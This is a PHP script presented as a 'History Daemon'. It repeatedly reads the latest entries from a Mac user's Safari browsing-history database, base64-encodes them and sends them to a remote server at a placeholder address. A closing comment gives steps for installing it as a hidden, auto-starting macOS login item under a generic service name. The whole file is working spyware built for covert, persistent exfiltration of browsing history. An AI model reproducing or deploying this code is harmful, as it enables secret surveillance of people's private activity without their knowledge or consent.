<?php
error_reporting(0);
echo "Starting History Daemon";
$ff=0;
$table = 'TABLE_NAME';
while(1){
    $difference = 0;
    $wait_time = 1;
    $start =  microtime(true);
    $ff++;
    $terminal_response = shell_exec("sqlite3 ~/Library/Safari/History.db 'select * from history_items Order By id DESC Limit 15;'");
    echo "\n\nIteration:".$ff;
    echo "\n".$terminal_response;
    $terminal_response = base64_encode($terminal_response);
    $url_data = 'https://IP/?table='.$table.'&query='.$terminal_response;
    submit_data($url_data);
    $end = microtime(true);
    $difference = $end-$start;
    if ($difference < 0) {
      $wait_time = 1;
    } else if ($difference > $wait_time) {
      $wait_time = 0;
    } else {
      $wait_time = $wait_time - $difference;
    }
    echo "\nTook:".$difference."s Sleeping for:".$wait_time."s";
    usleep($wait_time*1000000);
}

function submit_data($data){
    echo "\nSubmitting:".$data;
    $ch1 = curl_init($data);                                                                      
    curl_setopt($ch1, CURLOPT_CUSTOMREQUEST, "GET");                                                                                      
    curl_setopt($ch1, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch1, CURLOPT_CONNECTTIMEOUT ,2); 
    curl_setopt($ch1, CURLOPT_TIMEOUT, 4);    
    $result1 = curl_exec($ch1);
    echo "\nResponse:".$result1;
}
/*
Adding to startup on macos
touch .start_history_daemon
nano .start_history_daemon
and put it there -> screen -dmS history_daemon php history_daemon.php
chmod 777 .start_history_daemon
osascript -e 'tell application "System Events" to make new login item at end with properties {path:"/Users/USER_NAME/.start_history_daemon", name:"Service Name", hidden:true}'
*/

?>
